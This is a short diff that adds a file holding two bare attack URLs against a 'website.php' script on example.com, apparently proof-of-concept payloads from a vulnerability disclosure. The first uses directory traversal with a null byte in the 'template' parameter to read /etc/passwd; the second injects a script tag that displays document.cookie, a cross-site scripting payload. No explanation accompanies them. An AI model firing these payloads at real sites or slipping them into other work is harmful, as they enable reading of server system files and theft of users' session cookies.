@@ -1,0 +1,3 @@
+http://www.example.com/cms/website.php?template=../../../../../../../../etc/passwd%00
+
+http://www.example.com/cms/website.php?template=&lt;script&gt;alert(document.cookie)&lt;/script&gt;
